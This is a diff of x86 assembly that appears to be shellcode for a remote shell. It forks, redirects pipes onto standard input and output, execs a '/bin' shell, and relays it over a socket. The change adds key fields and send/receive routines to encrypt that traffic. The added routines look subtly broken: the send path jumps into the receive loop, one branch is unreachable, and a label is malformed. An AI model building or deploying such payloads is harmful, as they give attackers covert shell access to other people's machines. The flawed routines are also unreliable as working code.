@@ -54,12 +54,29 @@
 %define EPOLL_CTL_DEL 2
 %define EPOLL_CTL_MOD 3
 
-%define SYS_SOCKET      1
-%define SYS_BIND        2  
-%define SYS_CONNECT     3 
+%define SYS_SOCKET      1   
+%define SYS_BIND        2   
+%define SYS_CONNECT     3   
+%define SYS_LISTEN      4   
+%define SYS_ACCEPT      5 
+%define SYS_GETSOCKNAME 6   
+%define SYS_GETPEERNAME 7   
+%define SYS_SOCKETPAIR  8   
+%define SYS_SEND        9   
+%define SYS_RECV       10 
+%define SYS_SENDTO     11   
+%define SYS_RECVFROM   12   
+%define SYS_SHUTDOWN   13   
+%define SYS_SETSOCKOPT 14 
+%define SYS_GETSOCKOPT 15   
+%define SYS_SENDMSG    16   
+%define SYS_RECVMSG    17     
+%define SYS_ACCEPT4    18   
+%define SYS_RECVMMSG   19 
+%define SYS_SENDMMSG   20 
 
-%define SIGCHLD	20
-%define BUFSIZ 256
+%define SIGCHLD 20
+%define BUFSIZ  64
 
 %define SHUT_RDWR     1
 
@@ -78,7 +95,8 @@ struc sc_prop
   evt   resd 1  
   evts  resd 1
   buf   resb BUFSIZ
-  h     resd 1     
+  ekey  resb 16         ; encryption key
+  mkey  resb 16         ; mac key   
 endstruc
  
     %ifndef BIN
@@ -95,7 +113,7 @@ _main:
       mov    edi, esp
       mov    ebp, esp
       
-      ; create pipes
+      ; create read/write pipes
       push   2
       pop    ecx
 c_pipe:      
@@ -115,7 +133,7 @@ c_pipe:
       int    0x80    
       stosd                       ; save pid
       test   eax, eax
-      jz     connect
+      jz     c_con
 
       ; in this order..
       ;
@@ -124,12 +142,12 @@ c_pipe:
       ; dup2 (in[0], STDIN_FILENO)   
       mov    cl, 2
       mov    ebx, [ebp+p_out+4]
-dup_loop:
+c_dup:
       mov    al, SYS_dup2
       int    0x80 
       dec    ecx
       cmove  ebx, [ebp+p_in]
-      jns    dup_loop          ; jump if not signed   
+      jns    c_dup  
   
       ; in this order..
       ;
@@ -157,7 +175,7 @@ cls_pipes:
       push   '/bin'
       mov    ebx, esp
       int    0x80
-connect:    
+c_con:    
       ; close(p.in[0]);
       push   SYS_close
       pop    eax
@@ -309,14 +327,16 @@ shutdown:
       push   SYS_kill
       pop    eax
       mov    ebx, [ebp+pid]
-      mov    ecx, SIGCHLD
+      push   SIGCHLD
+      pop    ecx
       int    0x80
 
       ; shutdown(s, SHUT_RDWR);
       push   SYS_shutdown
       pop    eax
       mov    ebx, [ebp+s]
-      mov    ecx, SHUT_RDWR
+      push   SHUT_RDWR
+      pop    ecx
       int    0x80
 
       ; close(s);
@@ -345,6 +365,98 @@ exit:
       add    esp, sc_prop_size
       popad
       ret    
+      
+; ***********************************
+;
+; send packet, fragmented if required
+;
+; ***********************************
+send_pkt:
+      pushad
+      ; 1. wrap
+      stc
+      call   encrypt      
+      ; 2. send
+c_send:
+      xor    eax, eax
+      push   eax
+      mov    al, BUFSIZ
+      push   eax
+      lea    ecx, [ebp+buf]
+      push   ecx
+      push   dword[ebp+s]
+      mov    ecx, esp      
+      push   SYS_SEND
+      pop    ebx
+      push   SYS_socketcall
+      pop    eax      
+      int    0x80
+      add    esp, 4*4
+      test   eax, eax
+      jle    exit_rpkt
+      add    ebp, eax
+      jmp    r_pkt         
+      jg     c_send      
+      popad
+      ret
+; ***********************************
+;
+; send data, encrypted if required
+;
+; ***********************************      
+spp_send:
+      pushad
+      ; 1. send length of data
+      call   send_pkt
+      jle    exit_send      
+      ; 2. send the data
+      call   send_pkt      
+exit_send      
+      popad
+      ret
+; ***********************************
+;
+; receive packet, fragmented if required
+;
+; ***********************************
+recv_pkt:
+      pushad     
+      ; 1. receive
+      mov    ecx, esp      
+r_pkt:
+      push   SYS_RECV
+      pop    ebx
+      push   SYS_socketcall
+      pop    eax      
+      int    0x80
+      add    esp, 4*4
+      test   eax, eax
+      jle    exit_rpkt
+      add    ebp, eax
+      jmp    r_pkt
+      ; 2. unwrap
+      clc
+      call   encrypt
+      test   eax, eax
+exit_rpkt:      
+      mov    [esp+_eax], eax
+      popad
+      ret
+; ***********************************
+;
+; receive data, decrypt if required
+;
+; ***********************************      
+spp_recv:
+      pushad
+      ; 1. receive the length
+      call   recv_pkt
+      jle    exit_recv      
+      ; 2. receive the data
+      call   recv_pkt
+exit_recv:      
+      popad
+      ret
       
 %include "mx.asm"
 %include "rnx.asm"
